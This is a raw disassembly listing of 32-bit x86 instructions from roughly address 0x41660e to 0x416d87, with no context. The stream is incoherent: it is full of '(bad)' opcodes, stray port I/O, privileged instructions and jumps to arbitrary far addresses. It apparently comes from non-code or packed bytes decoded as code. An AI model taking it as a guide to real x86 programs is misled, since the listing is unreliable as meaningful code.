  41660e:	je     0x41665d
  416610:	sub    ah,BYTE PTR [ebp+0x59]
  416613:	xor    eax,0x32aee45c
  416618:	push   es
  416619:	mov    ebp,0x35f57fb5
  41661e:	ret    0x81c
  416621:	bound  edx,QWORD PTR [eax]
  416623:	cmp    BYTE PTR [edi+0x35],0xe9
  416627:	fsubr  DWORD PTR [edi+0x680c084d]
  41662d:	icebp  
  41662e:	mov    ?,WORD PTR [ecx+0x32]
  416631:	(bad)  
  416632:	not    BYTE PTR [esi+edi*2-0x2b]
  416636:	ja     0x416661
  416638:	inc    esi
  416639:	(bad)  ds:0x5ba5a5b5
  41663f:	xor    BYTE PTR [ecx+0x2a],ch
  416642:	jmp    0xe3aabd05
  416647:	cmp    BYTE PTR [edx],0xb2
  41664a:	xor    ch,BYTE PTR [esi+0x2c5d27fd]
  416650:	cmp    eax,0xa9f20c55
  416655:	inc    eax
  416656:	aaa    
  416657:	pop    edi
  416658:	daa    
  416659:	fmul   DWORD PTR [edi+0x474305c]
  41665f:	cmp    dl,BYTE PTR [ecx+0x55f6467a]
  416665:	out    0xfb,al
  416667:	sbb    DWORD PTR [eax-0x47],ecx
  41666a:	fidiv  WORD PTR [edx-0x54062a08]
  416670:	push   edx
  416671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416672:	fsubp  st(4),st
  416674:	fwait
  416675:	pop    edi
  416676:	push   0xe8a5aaf9
  41667b:	push   ecx
  41667c:	cdq    
  41667d:	mov    dl,0xb3
  41667f:	xor    DWORD PTR [ecx],eax
  416681:	stc    
  416682:	dec    edx
  416683:	in     al,0xfe
  416685:	push   es
  416686:	xchg   ecx,eax
  416687:	dec    esp
  416688:	bound  esi,QWORD PTR [esi+ecx*1]
  41668b:	scas   al,BYTE PTR es:[edi]
  41668c:	gs loopne 0x4166d2
  41668f:	adc    BYTE PTR [esi+0x6c43e706],0xc5
  416696:	xor    esp,ebx
  416698:	push   ss
  416699:	add    ecx,DWORD PTR [ecx-0x466066d1]
  41669f:	adc    DWORD PTR [eax-0x191bc380],edx
  4166a5:	popa   
  4166a6:	adc    esp,edi
  4166a8:	mov    bl,0x9a
  4166aa:	or     edi,DWORD PTR [edi+edi*4+0x7af1da06]
  4166b1:	or     eax,0xbed7e490
  4166b6:	aas    
  4166b7:	sbb    al,0xbe
  4166b9:	repz xor DWORD PTR [eax+0x2],0x1d948924
  4166c1:	jp     0x416657
  4166c3:	into   
  4166c4:	ins    DWORD PTR es:[edi],dx
  4166c5:	rcr    DWORD PTR [ebp-0xe047bb5],0xfd
  4166cc:	icebp  
  4166cd:	jle    0x4166a5
  4166cf:	lds    esi,FWORD PTR [edx+0x5020fd34]
  4166d5:	lea    eax,[ebx+0x33db29e6]
  4166db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166dc:	stc    
  4166dd:	cmp    BYTE PTR [ecx],0x4d
  4166e0:	(bad)  
  4166e1:	pusha  
  4166e2:	in     al,dx
  4166e3:	mov    ecx,0xc778ea9f
  4166e8:	mov    WORD PTR [edx+0x7f3e3adc],ds
  4166ee:	in     eax,0xb2
  4166f0:	mov    esp,edi
  4166f2:	scas   eax,DWORD PTR es:[edi]
  4166f3:	clc    
  4166f4:	jno    0x41675c
  4166f6:	or     DWORD PTR [ecx-0x54],0xffffffc6
  4166fa:	jecxz  0x416728
  4166fc:	mov    WORD PTR [esi],es
  4166fe:	sub    ch,dl
  416700:	gs mov ch,0xe9
  416703:	clc    
  416704:	ret    
  416705:	das    
  416706:	push   eax
  416707:	dec    edx
  416708:	fsubr  DWORD PTR fs:[edx+0x21]
  41670c:	jbe    0x416769
  41670e:	pop    esp
  41670f:	push   esp
  416710:	fs push ebx
  416712:	push   eax
  416713:	mov    ch,0xb0
  416715:	xor    BYTE PTR [edx-0x50],bh
  416718:	cdq    
  416719:	mov    BYTE PTR [edx+edx*1+0x632f636d],cl
  416720:	loop   0x416712
  416722:	jg     0x41677c
  416724:	xor    al,0x9
  416726:	popf   
  416727:	enter  0x8323,0x3e
  41672b:	cli    
  41672c:	fld    DWORD PTR [ecx+0x3763a8b4]
  416732:	sti    
  416733:	ins    DWORD PTR es:[edi],dx
  416734:	xchg   ebx,eax
  416735:	fimul  DWORD PTR [edi]
  416737:	cld    
  416738:	cwde   
  416739:	xchg   BYTE PTR [eax],cl
  41673b:	jo     0x4166cf
  41673d:	daa    
  41673e:	inc    edx
  41673f:	xchg   ebx,eax
  416740:	or     BYTE PTR ds:0x5994,al
  416745:	mov    DWORD PTR [esi],edi
  416747:	retf   0x5e6a
  41674a:	stos   DWORD PTR es:[edi],eax
  41674b:	js     0x4166e0
  41674d:	iret   
  41674e:	sahf   
  41674f:	xchg   ebp,eax
  416750:	mov    ecx,0xf888d298
  416755:	js     0x416763
  416757:	inc    esi
  416758:	aam    0xde
  41675a:	cmp    BYTE PTR [ecx+eiz*1],bh
  41675d:	in     eax,0x20
  41675f:	sbb    DWORD PTR [edx],0x40
  416762:	into   
  416763:	mov    esp,0x2cb70b40
  416768:	lock jnp 0x416722
  41676b:	ror    BYTE PTR [esi],0x55
  41676e:	imul   edx,ebp,0x90ea0bbc
  416774:	jmp    0xbadffbfd
  416779:	je     0x416771
  41677b:	in     eax,0x9a
  41677d:	fstp   DWORD PTR [edx+0xc876167]
  416783:	adc    edi,DWORD PTR [ebp+0x32]
  416786:	stos   DWORD PTR es:[edi],eax
  416787:	adc    DWORD PTR [eax-0x3abac33],eax
  41678d:	sbb    BYTE PTR [edx+0x2dbec1f0],dl
  416793:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416794:	add    bl,BYTE PTR [edx+0x57530a61]
  41679a:	add    al,0xca
  41679c:	and    esi,ecx
  41679e:	pop    ebx
  41679f:	ins    DWORD PTR es:[edi],dx
  4167a0:	test   DWORD PTR [eax-0x76],0x25857473
  4167a7:	xchg   ecx,eax
  4167a8:	jb     0x4167b8
  4167aa:	mov    dl,0x53
  4167ac:	adc    BYTE PTR [eax],al
  4167ae:	(bad)  
  4167af:	jnp    0x416798
  4167b1:	call   edx
  4167b3:	adc    dh,dl
  4167b5:	adc    BYTE PTR [eax],dl
  4167b7:	or     BYTE PTR [eax],0x73
  4167ba:	es aaa 
  4167bc:	hlt    
  4167bd:	cwde   
  4167be:	out    dx,al
  4167bf:	pusha  
  4167c0:	mov    ds:0x8d3b566d,al
  4167c5:	xchg   edi,eax
  4167c6:	icebp  
  4167c7:	adc    cl,BYTE PTR [eax+0xb]
  4167ca:	pop    edx
  4167cb:	push   ecx
  4167cc:	daa    
  4167cd:	bound  esp,QWORD PTR [ebp-0x7a]
  4167d0:	mov    dl,0x1b
  4167d2:	push   edi
  4167d3:	enter  0x6d1a,0x50
  4167d7:	(bad)  
  4167d8:	mov    WORD PTR [esi],ds
  4167da:	icebp  
  4167db:	loopne 0x4167dc
  4167dd:	mov    WORD PTR [ecx+edi*1],?
  4167e0:	pop    ss
  4167e1:	mov    al,ds:0xdd5abbc9
  4167e6:	test   BYTE PTR [ebp-0x35],dl
  4167e9:	sub    esp,DWORD PTR [esi]
  4167eb:	or     al,0x2f
  4167ed:	cmp    cl,0x33
  4167f0:	in     eax,0xe1
  4167f2:	pop    esp
  4167f3:	jle    0x416857
  4167f5:	inc    edi
  4167f6:	aam    0x67
  4167f8:	push   edx
  4167f9:	sub    al,0x29
  4167fb:	jo     0x41684a
  4167fd:	cmp    al,0x13
  4167ff:	mov    esp,0xe14ecd7d
  416804:	rol    DWORD PTR [edi+0x47],1
  416807:	call   FWORD PTR [ebx]
  416809:	(bad)  
  41680a:	(bad)  
  41680b:	div    DWORD PTR [edi-0x73]
  41680e:	(bad)  
  41680f:	cmp    DWORD PTR [ebx+0x79],edx
  416812:	push   ebx
  416813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416814:	sbb    eax,DWORD PTR [eax]
  416816:	xor    ah,dl
  416818:	test   BYTE PTR ds:0x3f121e37,ch
  41681e:	stos   DWORD PTR es:[edi],eax
  41681f:	xchg   esp,eax
  416820:	stc    
  416821:	sysenter 
  416823:	jne    0x4167e0
  416825:	mov    ebp,0xa2f1f18
  41682a:	xor    ebp,esi
  41682c:	fwait
  41682d:	mov    al,0x6d
  41682f:	jmp    0x7e03:0xe726c31f
  416836:	add    eax,0x3a55edb8
  41683b:	pop    edx
  41683c:	sub    eax,0xf6783bcf
  416841:	retf   
  416842:	jb     0x416893
  416844:	dec    ebp
  416845:	pop    ds
  416846:	inc    ecx
  416847:	jg     0x41686d
  416849:	or     DWORD PTR [ebx],0x40
  41684c:	into   
  41684d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41684e:	xor    dl,BYTE PTR [edi+0x24]
  416851:	push   ebx
  416852:	faddp  st(6),st
  416854:	adc    al,0xa1
  416856:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416857:	loopne 0x416834
  416859:	jmp    0x54be:0x3fc80263
  416860:	bound  ecx,QWORD PTR [edi+edi*8+0x1]
  416864:	sbb    DWORD PTR [esi+0x57],eax
  416867:	loopne 0x4167f4
  416869:	pop    edi
  41686a:	mov    eax,ds:0xcb47924a
  41686f:	call   0x6373:0x811cd98a
  416876:	mov    dl,0x40
  416878:	mov    bh,0x48
  41687a:	mov    dh,0x2c
  41687c:	sar    eax,1
  41687e:	in     al,0xd2
  416880:	fisttp QWORD PTR [esi]
  416882:	int    0x10
  416884:	repz cmp edx,DWORD PTR ds:0x212a8678
  41688b:	test   DWORD PTR [esi+0x11175bc],esi
  416891:	loopne 0x4168e4
  416893:	scas   al,BYTE PTR es:[edi]
  416894:	shl    DWORD PTR [esi-0x567d2278],0x15
  41689b:	or     esi,DWORD PTR [ebp+0x4ad0fefc]
  4168a1:	add    eax,0x816a0f0c
  4168a6:	outs   dx,BYTE PTR ds:[esi]
  4168a7:	retf   0xefbe
  4168aa:	cs iret 
  4168ac:	sub    eax,0x16a67e8c
  4168b1:	pop    ss
  4168b2:	dec    ebx
  4168b3:	in     eax,0xbf
  4168b5:	fstp   DWORD PTR [edx-0x7b6dcfbf]
  4168bb:	sbb    al,0xd2
  4168bd:	xchg   edx,eax
  4168be:	xchg   ecx,eax
  4168bf:	fwait
  4168c0:	sub    al,0xaf
  4168c2:	jle    0x416922
  4168c4:	arpl   WORD PTR [esi],ax
  4168c6:	lds    ebp,FWORD PTR [edx-0x3f]
  4168c9:	js     0x416940
  4168cb:	int3   
  4168cc:	test   BYTE PTR [ecx+esi*8],dh
  4168cf:	mov    dl,0xaf
  4168d1:	cmp    al,0xa5
  4168d3:	jg     0x41688c
  4168d5:	pop    edi
  4168d6:	lods   eax,DWORD PTR ds:[esi]
  4168d7:	jge    0x4168f8
  4168d9:	xchg   ecx,edx
  4168db:	lods   eax,DWORD PTR ds:[esi]
  4168dc:	push   ebx
  4168dd:	and    ch,al
  4168df:	xor    dl,BYTE PTR [eax]
  4168e1:	daa    
  4168e2:	jg     0x416896
  4168e4:	std    
  4168e5:	(bad)  ds:0x9a2981c6
  4168eb:	xchg   ebx,eax
  4168ec:	lods   al,BYTE PTR ds:[esi]
  4168ed:	mov    ch,0x59
  4168ef:	mov    al,dh
  4168f1:	(bad)  
  4168f2:	repnz mov ebp,0x7f26edd8
  4168f8:	pop    ss
  4168f9:	adc    eax,DWORD PTR [ebp-0x6033f933]
  4168ff:	jp     0x4168a6
  416901:	ss mov ch,0xaf
  416904:	pop    ds
  416905:	stos   BYTE PTR es:[edi],al
  416906:	aad    0xdf
  416908:	mov    BYTE PTR [edx+esi*2+0x57],al
  41690c:	xor    BYTE PTR [edx-0x55],dl
  41690f:	jge    0x416969
  416911:	nop
  416912:	test   al,dh
  416914:	imul   edi,DWORD PTR ds:[edi],0x5cc55595
  41691b:	sbb    esi,DWORD PTR [edi]
  41691d:	int3   
  41691e:	and    esi,DWORD PTR [ecx-0xf]
  416921:	loope  0x416995
  416923:	test   BYTE PTR [ebx+0x291eea4],bh
  416929:	jmp    0x2bf48591
  41692e:	lods   al,BYTE PTR ds:[esi]
  41692f:	mul    DWORD PTR [ecx+0x73]
  416932:	jle    0x416938
  416934:	sahf   
  416935:	or     dh,BYTE PTR [edi-0x75]
  416938:	lea    edx,[ecx-0x7e]
  41693b:	fs pop ecx
  41693d:	xchg   edi,eax
  41693e:	xchg   ecx,eax
  41693f:	jns    0x416909
  416941:	mul    DWORD PTR [esi-0x22]
  416944:	pop    ecx
  416945:	outs   dx,BYTE PTR ds:[esi]
  416946:	ret    
  416947:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416948:	or     DWORD PTR [ebp+0x1c],esi
  41694b:	xchg   ecx,eax
  41694c:	outs   dx,BYTE PTR ds:[esi]
  41694d:	scas   al,BYTE PTR es:[edi]
  41694e:	and    dl,dh
  416950:	clc    
  416951:	gs popf 
  416953:	and    DWORD PTR [edx-0x584c2513],ecx
  416959:	outs   dx,DWORD PTR ds:[esi]
  41695a:	adc    al,0xca
  41695c:	xchg   esp,eax
  41695d:	cmp    al,0x52
  41695f:	sbb    ecx,edi
  416961:	push   cs
  416962:	mov    bl,0xd7
  416964:	adc    dh,BYTE PTR [ecx]
  416966:	in     al,0x43
  416968:	out    dx,eax
  416969:	sbb    al,0x81
  41696b:	nop
  41696c:	test   al,0x44
  41696e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41696f:	dec    edx
  416970:	pop    esi
  416971:	and    DWORD PTR [ebp-0x24b7cd91],0x1e880199
  41697b:	lds    eax,FWORD PTR [ecx+0x487cc8b4]
  416981:	and    DWORD PTR ds:0x907d0b1e,esp
  416987:	in     al,dx
  416988:	adc    DWORD PTR [ebx+0xf],esi
  41698b:	push   ds
  41698c:	push   es
  41698d:	mov    ch,0x53
  41698f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416990:	sub    al,0x61
  416992:	std    
  416993:	mov    dl,0x60
  416995:	repz imul ecx,DWORD PTR ds:0x2bcb70ce,0xffffff87
  41699d:	jne    0x4169f2
  41699f:	test   BYTE PTR [ecx+0x16],al
  4169a2:	stc    
  4169a3:	push   esi
  4169a4:	stos   DWORD PTR es:[edi],eax
  4169a5:	cmp    al,0xa5
  4169a7:	mov    ch,0xc
  4169a9:	(bad)  
  4169aa:	enter  0xd338,0xb2
  4169ae:	add    ecx,edi
  4169b0:	cmc    
  4169b1:	bound  esp,QWORD PTR ds:0x35609607
  4169b7:	sahf   
  4169b8:	shl    ebx,0x76
  4169bb:	test   al,0x7d
  4169bd:	and    eax,0xf4e1f849
  4169c2:	into   
  4169c3:	aam    0xa8
  4169c5:	mov    edx,0xaa91645e
  4169ca:	sbb    eax,0xe20486ec
  4169cf:	mov    DWORD PTR [ebx+0x7a],ebx
  4169d2:	aas    
  4169d3:	dec    ecx
  4169d4:	fsubr  DWORD PTR [ebx+0x76]
  4169d7:	std    
  4169d8:	adc    BYTE PTR [ebp+0x39],dl
  4169db:	mul    ch
  4169dd:	xlat   BYTE PTR ds:[ebx]
  4169de:	(bad)  
  4169df:	std    
  4169e0:	int3   
  4169e1:	(bad)  
  4169e2:	push   cs
  4169e3:	ret    
  4169e4:	xchg   ebx,eax
  4169e5:	push   edi
  4169e6:	xor    esp,DWORD PTR [eiz*1-0x155b29a7]
  4169ed:	sbb    bl,BYTE PTR [esi-0x536ca60b]
  4169f3:	daa    
  4169f4:	inc    esi
  4169f5:	jo     0x416a74
  4169f7:	and    edi,edx
  4169f9:	mov    edi,0x56f24157
  4169fe:	mov    ch,0x82
  416a00:	inc    esp
  416a01:	push   cs
  416a02:	sbb    ah,BYTE PTR [ebx+0xf]
  416a05:	aam    0xd2
  416a07:	push   es
  416a08:	loope  0x4169ae
  416a0a:	mov    esp,0xace53ac1
  416a0f:	jg     0x4169ce
  416a11:	daa    
  416a12:	stos   BYTE PTR es:[edi],al
  416a13:	dec    eax
  416a14:	sub    ebx,ebp
  416a16:	jae    0x416a8c
  416a18:	xlat   BYTE PTR ds:[ebx]
  416a19:	leave  
  416a1a:	shr    DWORD PTR [edx+0x28],0xf5
  416a1e:	es mov dh,0x88
  416a21:	js     0x416a9f
  416a23:	lods   al,BYTE PTR ds:[esi]
  416a24:	or     eax,0x5aabfa45
  416a29:	inc    ebx
  416a2a:	push   edi
  416a2b:	cmp    al,0x6c
  416a2d:	push   ebx
  416a2e:	pop    eax
  416a2f:	mov    edi,0x48373f97
  416a34:	fdivr  DWORD PTR [eax]
  416a36:	out    0x16,eax
  416a38:	arpl   WORD PTR [esi-0x220dc6a2],cx
  416a3e:	shl    ch,cl
  416a40:	rol    esp,1
  416a42:	cdq    
  416a43:	xchg   ecx,eax
  416a44:	jno    0x416a8c
  416a46:	nop
  416a47:	test   DWORD PTR [ebx-0x44],ebx
  416a4a:	pop    esi
  416a4b:	loop   0x416a93
  416a4d:	data16 sbb al,0xb1
  416a50:	jae    0x416a4a
  416a52:	xchg   edi,eax
  416a53:	push   esi
  416a54:	or     BYTE PTR [eax],0x80
  416a57:	scas   eax,DWORD PTR es:[edi]
  416a58:	mov    al,ds:0x1c9ad9bf
  416a5d:	and    DWORD PTR [ecx+edi*2+0x19],ebx
  416a61:	retf   
  416a62:	in     al,dx
  416a63:	mov    ah,BYTE PTR [eax-0x3d63babc]
  416a69:	adc    BYTE PTR [ebx],0x9d
  416a6c:	add    al,0x44
  416a6e:	push   0xffffffb3
  416a70:	(bad)  
  416a71:	pop    ds
  416a72:	dec    esp
  416a73:	arpl   WORD PTR [edx-0x589a506e],cx
  416a79:	xchg   DWORD PTR [edi],ebx
  416a7b:	sti    
  416a7c:	or     bh,cl
  416a7e:	or     al,0x80
  416a80:	mov    al,0xb3
  416a82:	and    al,0x85
  416a84:	paddd  mm7,QWORD PTR [ecx]
  416a87:	adc    eax,0xd7b2a414
  416a8c:	fs scas eax,DWORD PTR es:[edi]
  416a8e:	ss push edi
  416a90:	cmp    DWORD PTR [ebx+0x0],edx
  416a93:	mov    eax,0xc73f587
  416a98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a99:	xchg   ebx,eax
  416a9a:	not    DWORD PTR [ebp+0x16]
  416a9d:	imul   esp,DWORD PTR [ebp-0x4aed42d8],0xffffffd1
  416aa4:	xor    dh,0xa2
  416aa7:	test   eax,0x3d09f0e0
  416aac:	ds ins DWORD PTR es:[edi],dx
  416aae:	outs   dx,BYTE PTR ds:[esi]
  416aaf:	mov    esp,0xd012af4c
  416ab4:	xchg   esp,eax
  416ab5:	ret    
  416ab6:	cmp    DWORD PTR [ebx+0x6739bd4a],ecx
  416abc:	or     ah,BYTE PTR [edi]
  416abe:	and    esp,DWORD PTR [ebx]
  416ac0:	(bad)  
  416ac1:	stc    
  416ac2:	dec    ebp
  416ac3:	dec    edi
  416ac4:	das    
  416ac5:	cmp    eax,0x63faeeb8
  416aca:	es and al,0x73
  416acd:	je     0x416ab6
  416acf:	mov    al,ds:0x2fb88ffd
  416ad4:	clc    
  416ad5:	pop    ecx
  416ad6:	mov    al,0xd9
  416ad8:	xchg   ebx,eax
  416ad9:	fld    QWORD PTR cs:[ecx+0x7d]
  416add:	(bad)  
  416ade:	fcomp  DWORD PTR ds:0xc9ced564
  416ae4:	ror    BYTE PTR [ebp-0x4dd36d85],0x9b
  416aeb:	div    BYTE PTR [eax]
  416aed:	(bad)  
  416aee:	aam    0x7
  416af0:	mov    eax,0x5230268f
  416af5:	jns    0x416b0c
  416af7:	jmp    0x4472c1d4
  416afc:	jg     0x416b6f
  416afe:	xchg   esi,eax
  416aff:	mov    ah,0xf
  416b01:	mov    ecx,0x614598d6
  416b06:	xor    esi,edx
  416b08:	cwde   
  416b09:	xor    DWORD PTR [edi],edi
  416b0b:	push   ecx
  416b0c:	or     BYTE PTR [edi],ch
  416b0e:	inc    esp
  416b0f:	and    ebx,0x31
  416b12:	sbb    eax,0xf2b1c67a
  416b17:	mov    edx,0xa416cdf2
  416b1c:	mov    ecx,edx
  416b1e:	mov    ebx,0xb82ea6b8
  416b23:	jne    0x416afd
  416b25:	into   
  416b26:	mov    DWORD PTR [esi],esi
  416b28:	(bad)  
  416b29:	retf   
  416b2a:	pushf  
  416b2b:	ret    0xd679
  416b2e:	ret    
  416b2f:	sti    
  416b30:	stos   DWORD PTR es:[edi],eax
  416b31:	fsubr  st(4),st
  416b33:	loopne 0x416ad1
  416b35:	pop    edx
  416b36:	sub    ah,BYTE PTR [ecx+0x660705f1]
  416b3c:	add    BYTE PTR [ecx-0x59807305],dh
  416b42:	pop    edx
  416b43:	and    eax,DWORD PTR [edx]
  416b45:	daa    
  416b46:	mov    BYTE PTR [ebx],al
  416b48:	stos   DWORD PTR es:[edi],eax
  416b49:	pop    esi
  416b4a:	sbb    eax,0x1ae47653
  416b4f:	inc    edi
  416b50:	ficom  DWORD PTR [edi+0x14dcda6a]
  416b56:	bound  esp,QWORD PTR [esi-0x4e]
  416b59:	and    eax,0x19a3ae56
  416b5e:	push   es
  416b5f:	dec    eax
  416b60:	add    BYTE PTR [esp+ebx*8-0x5e],0x99
  416b65:	mov    ds:0xa851dbe,eax
  416b6a:	aaa    
  416b6b:	les    ebp,FWORD PTR [ecx+ebp*2+0x4e]
  416b6f:	imul   edi,DWORD PTR [eax-0x2c],0x9f71d2bf
  416b76:	test   eax,0x16b3ee65
  416b7b:	fs cmc 
  416b7d:	test   DWORD PTR [ebx-0x2b],ebx
  416b80:	pop    ss
  416b81:	or     esp,DWORD PTR [esi]
  416b83:	(bad)  
  416b84:	fist   WORD PTR [ebx-0x8ca2fee]
  416b8a:	cmp    BYTE PTR [edx+0x39],bh
  416b8d:	fild   QWORD PTR [edi]
  416b8f:	mov    DWORD PTR [esi+ecx*4+0x304e1c7f],ebx
  416b96:	dec    ebx
  416b97:	call   0x6d28:0x4fe93222
  416b9e:	pop    edx
  416b9f:	dec    ecx
  416ba0:	shl    BYTE PTR [ecx],cl
  416ba2:	inc    ebp
  416ba3:	mov    al,0x37
  416ba5:	je     0x416be6
  416ba7:	pop    ds
  416ba8:	dec    esi
  416ba9:	pusha  
  416baa:	jo     0x416bc2
  416bac:	lods   al,BYTE PTR ds:[esi]
  416bad:	aas    
  416bae:	xor    al,bl
  416bb0:	div    BYTE PTR [esi]
  416bb2:	mov    ebx,0x55e308e7
  416bb7:	out    dx,al
  416bb8:	sbb    BYTE PTR [ebx+0xb8df078],0xd7
  416bbf:	dec    edx
  416bc0:	sub    eax,0x686a44d8
  416bc5:	cli    
  416bc6:	stc    
  416bc7:	jle    0x416bab
  416bc9:	das    
  416bca:	push   ebx
  416bcb:	dec    esp
  416bcc:	out    dx,eax
  416bcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bce:	cmp    bh,BYTE PTR [edx]
  416bd0:	or     al,BYTE PTR [ebx]
  416bd2:	push   esi
  416bd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bd4:	dec    ebp
  416bd5:	ins    DWORD PTR es:[edi],dx
  416bd6:	nop
  416bd7:	jmp    0x416c18
  416bd9:	inc    esp
  416bda:	mov    cl,dl
  416bdc:	mov    edx,0xb77de1e0
  416be1:	fwait
  416be2:	xor    eax,0x8d8264ac
  416be7:	cmp    al,0x6
  416be9:	mov    bh,BYTE PTR [esp+ecx*1+0x18]
  416bed:	int3   
  416bee:	sbb    al,0x3e
  416bf0:	mov    WORD PTR [esi],?
  416bf2:	test   al,0x16
  416bf4:	mov    ebx,0xcb8726f1
  416bf9:	mov    al,ds:0x1e4836b6
  416bfe:	nop
  416bff:	push   ebp
  416c00:	pop    ecx
  416c01:	clc    
  416c02:	xchg   edx,eax
  416c03:	adc    BYTE PTR [ecx+0x4f],al
  416c06:	ins    BYTE PTR es:[edi],dx
  416c07:	dec    edi
  416c08:	mov    ebp,0x23291d63
  416c0d:	dec    edx
  416c0e:	out    0x78,eax
  416c10:	and    cl,ch
  416c12:	add    eax,0x8564069a
  416c17:	mov    ebx,0x1f292ab8
  416c1c:	pusha  
  416c1d:	in     eax,dx
  416c1e:	or     ebp,DWORD PTR [ebp-0x64]
  416c21:	mov    DWORD PTR [eax+0x8],0x87ec255e
  416c28:	stos   BYTE PTR es:[edi],al
  416c29:	in     eax,0x4d
  416c2b:	mov    WORD PTR [edx-0x40],ss
  416c2e:	stos   DWORD PTR es:[edi],eax
  416c2f:	push   ds
  416c30:	cmp    ah,BYTE PTR [eax+ecx*4+0x20]
  416c34:	mov    DWORD PTR [edx+edi*8+0x52109944],esi
  416c3b:	mov    ebx,0x75455abb
  416c40:	cld    
  416c41:	clc    
  416c42:	das    
  416c43:	pop    ss
  416c44:	cs jle 0x416bdd
  416c47:	or     al,0xba
  416c49:	pop    ecx
  416c4a:	push   esi
  416c4b:	mov    ds:0xbe9c9e05,eax
  416c50:	gs dec eax
  416c52:	jo     0x416bd9
  416c54:	cs push esi
  416c56:	push   es
  416c57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c58:	retf   0xb3bc
  416c5b:	out    0x84,eax
  416c5d:	int3   
  416c5e:	jbe    0x416cad
  416c60:	fimul  WORD PTR [edx+0x79632331]
  416c66:	add    eax,0x3769708f
  416c6b:	pop    esp
  416c6c:	jns    0x416bf7
  416c6e:	popf   
  416c6f:	push   ebx
  416c70:	push   0x71
  416c72:	js     0x416c3b
  416c74:	and    ch,ch
  416c76:	xchg   DWORD PTR ds:0xc73794f5,ebp
  416c7c:	in     al,dx
  416c7d:	jae    0x416c1a
  416c7f:	xchg   ebx,eax
  416c80:	sub    cl,BYTE PTR [eax+esi*8]
  416c83:	or     ah,al
  416c85:	aas    
  416c86:	xor    dl,bl
  416c88:	mov    edx,0x5bf295c1
  416c8d:	mov    eax,0x8c585618
  416c92:	into   
  416c93:	dec    edx
  416c94:	outs   dx,DWORD PTR ds:[esi]
  416c95:	pop    ebp
  416c96:	add    DWORD PTR [ebx],ecx
  416c98:	dec    ecx
  416c99:	push   edx
  416c9a:	mov    edi,DWORD PTR [edx]
  416c9c:	jp     0x416cfa
  416c9e:	fcomi  st,st(4)
  416ca0:	(bad)  [ebx-0x7f4ec44f]
  416ca6:	je     0x416c30
  416ca8:	mov    eax,0xb1dfcf4d
  416cad:	or     ah,ah
  416caf:	(bad)  
  416cb0:	jnp    0x416ce9
  416cb2:	add    al,0x48
  416cb4:	jb     0x416c83
  416cb6:	sbb    al,0x4d
  416cb8:	and    DWORD PTR [ebx-0x17f68597],0xffffffaf
  416cbf:	div    BYTE PTR [ecx+0x763e5fb0]
  416cc5:	mov    dh,0x16
  416cc7:	stos   DWORD PTR es:[edi],eax
  416cc8:	in     al,0xf1
  416cca:	xor    DWORD PTR [eax+ebp*2],esi
  416ccd:	aas    
  416cce:	scas   al,BYTE PTR es:[edi]
  416ccf:	sbb    edx,DWORD PTR [edi+0x39d64aa5]
  416cd5:	mov    WORD PTR [ebx+0x600960c0],ds
  416cdb:	out    0xe6,eax
  416cdd:	pcmpeqb mm7,QWORD PTR [edx+0xe6972cb]
  416ce4:	inc    ebp
  416ce5:	pop    ebx
  416ce6:	sub    BYTE PTR [ebx+0x6e],bl
  416ce9:	js     0x416cd3
  416ceb:	inc    edx
  416cec:	sub    DWORD PTR [eax+0xe],esi
  416cef:	aad    0xce
  416cf1:	push   esp
  416cf2:	out    dx,eax
  416cf3:	js     0x416d0a
  416cf5:	push   esi
  416cf6:	in     al,dx
  416cf7:	imul   ecx,DWORD PTR fs:[edx-0x30],0x4da6853f
  416cff:	sub    DWORD PTR ds:0xb1d152ff,edx
  416d05:	xchg   esp,eax
  416d06:	adc    dh,ah
  416d08:	popa   
  416d09:	cmc    
  416d0a:	xchg   esi,eax
  416d0b:	xchg   esi,eax
  416d0c:	xor    DWORD PTR [eax],ebx
  416d0e:	pop    ebx
  416d0f:	in     eax,dx
  416d10:	leave  
  416d11:	dec    ebx
  416d12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d13:	aam    0x4e
  416d15:	imul   ecx,DWORD PTR [eax],0x10c1c7fb
  416d1b:	sbb    ecx,ebx
  416d1d:	add    DWORD PTR [ebp+0x620b7411],ecx
  416d23:	jl     0x416cb2
  416d25:	jae    0x416cf6
  416d27:	sti    
  416d28:	pcmpeqb mm0,mm0
  416d2b:	cmp    edi,ecx
  416d2d:	xlat   BYTE PTR ds:[ebx]
  416d2e:	and    BYTE PTR [esi+esi*2+0x15],ch
  416d32:	or     eax,0x26c941ec
  416d37:	pop    edx
  416d38:	cmp    al,0xe8
  416d3a:	jns    0x416d09
  416d3c:	out    dx,eax
  416d3d:	lds    edx,FWORD PTR [edi]
  416d3f:	repnz pop edx
  416d41:	(bad)  
  416d42:	scas   al,BYTE PTR es:[edi]
  416d43:	inc    esi
  416d44:	xor    al,0x50
  416d46:	int    0xf1
  416d48:	pop    edi
  416d49:	fimul  WORD PTR [esi+0x5753674e]
  416d4f:	imul   ebx,DWORD PTR [eax-0x1d],0xa11247dc
  416d56:	ss dec edi
  416d58:	(bad)  
  416d59:	je     0x416dcf
  416d5b:	pop    esi
  416d5c:	or     eax,0x376d1704
  416d61:	mov    ds:0x3f1fc7b6,eax
  416d66:	and    al,0x8f
  416d68:	inc    esp
  416d69:	xchg   edi,eax
  416d6a:	retf   0xfd11
  416d6d:	xchg   ecx,edx
  416d6f:	arpl   WORD PTR [ecx+0x50],di
  416d72:	jne    0x416d98
  416d74:	pop    ebp
  416d75:	mov    eax,0x3fc51dc4
  416d7a:	(bad)  
  416d7b:	ret    
  416d7c:	mov    bh,0x9c
  416d7e:	adc    BYTE PTR [edx-0xf],bl
  416d81:	sub    edi,edi
  416d83:	inc    edi
  416d84:	rcl    DWORD PTR [ebp-0x60],1
  416d87:	push   ebx
